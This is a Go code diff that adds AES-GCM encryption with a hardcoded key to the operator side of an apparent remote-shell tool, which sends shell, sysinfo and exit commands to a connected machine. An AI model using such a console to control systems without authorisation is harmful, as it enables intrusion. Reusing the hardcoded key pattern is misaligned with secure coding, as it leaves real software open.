@@ -3,8 +3,12 @@ package main
 import (
 	// Standard
 	"bufio"
-	"fmt"
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
 	"encoding/gob"
+	"fmt"
+	"io"
 	"net"
 	"os"
 	"strings"
@@ -14,6 +18,34 @@ import (
 )
 
 
+func encrypt(input string) []byte {
+	mes := []byte(input)
+	key := []byte("passphrasewhichneedstobe32bytes!")
+
+	c, err := aes.NewCipher(key)
+
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	gcm, err := cipher.NewGCM(c)
+
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	nonce := make([]byte, gcm.NonceSize())
+
+	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
+		fmt.Println(err)
+	}
+
+	mes = gcm.Seal(nonce, nonce, mes, nil)
+
+	return mes
+}
+
+
 func shell(conn net.Conn) {
 	enc := gob.NewEncoder(conn)
 	dec := gob.NewDecoder(conn)
@@ -21,19 +53,22 @@ func shell(conn net.Conn) {
 	shellLoop:for {
 		fmt.Printf(color.Green + "[shell]: " + color.Reset)
 		shellCmd, _ := bufio.NewReader(os.Stdin).ReadString('\n')
-		shellCmd = strings.TrimSuffix(shellCmd, "\n")
+		shellCmd = strings.TrimSuffix(shellCmd, "\n") 
 
 		switch {
 		case shellCmd == "":
 			continue
 		case shellCmd == "close":
-			enc.Encode(shellCmd)
+			encShellCmd := encrypt(shellCmd)
+			enc.Encode(encShellCmd)
 			break shellLoop
 		case shellCmd == "exit":
 			exit(conn)
+			break shellLoop
 		default:
 			result := ""
-			enc.Encode(shellCmd)
+			encShellCmd := encrypt(shellCmd)
+			enc.Encode(encShellCmd)
 			dec.Decode(&result)
 			result = strings.TrimSuffix(result, "\n")
 			fmt.Println(string(result))
@@ -46,7 +81,7 @@ func sysinfo(conn net.Conn) {
 	enc := gob.NewEncoder(conn)
 	dec := gob.NewDecoder(conn)
 
-	enc.Encode("sysinfo")
+	enc.Encode(encrypt("sysinfo"))
 
 	result := ""
 	dec.Decode(&result)
@@ -64,7 +99,7 @@ func sysinfo(conn net.Conn) {
 
 func exit(conn net.Conn) {
 	enc := gob.NewEncoder(conn)
-	enc.Encode("exit")
+	enc.Encode(encrypt("exit"))
 	conn.Close()
 }
 
